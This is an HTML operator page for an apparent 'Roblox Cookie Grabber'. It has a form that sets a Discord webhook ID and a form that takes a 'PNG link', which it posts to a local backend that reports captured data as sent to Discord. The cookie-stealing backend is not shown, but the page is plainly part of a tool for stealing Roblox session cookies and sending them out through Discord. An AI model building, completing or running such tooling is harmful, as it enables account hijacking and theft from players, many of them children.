<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Grabber</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        form {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
        }
        button {
            padding: 10px 15px;
            background-color: #007BFF;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <h1>Roblox Cookie Grabber</h1>

    <!-- Form to set the webhook ID -->
    <form id="webhookForm">
        <label for="webhookId">Webhook ID:</label>
        <input type="text" id="webhookId" name="webhookId" required>
        <button type="submit">Set Webhook ID</button>
    </form>

    <!-- Form to capture and send the PNG link (initially hidden) -->
    <form id="captureForm" style="display: none;">
        <label for="pngLink">PNG Link:</label>
        <input type="text" id="pngLink" name="pngLink" required>
        <button type="submit">Capture and Send</button>
    </form>

    <script>
        document.getElementById('webhookForm').addEventListener('submit', async (event) => {
            event.preventDefault();
            const webhookId = document.getElementById('webhookId').value;
            const response = await fetch('http://localhost:3001/set-webhook', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ webhookId })
            });

            if (response.ok) {
                alert('Webhook ID set!');
                document.getElementById('webhookForm').style.display = 'none';
                document.getElementById('captureForm').style.display = 'block';
            } else {
                alert('Failed to set webhook ID.');
            }
        });

        document.getElementById('captureForm').addEventListener('submit', async (event) => {
            event.preventDefault();
            const pngLink = document.getElementById('pngLink').value;
            const response = await fetch('http://localhost:3001/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ pngLink })
            });

            if (response.ok) {
                alert('Data captured and sent to Discord!');
            } else {
                alert('Failed to capture and send data.');
            }
        });
    </script>
</body>
</html>
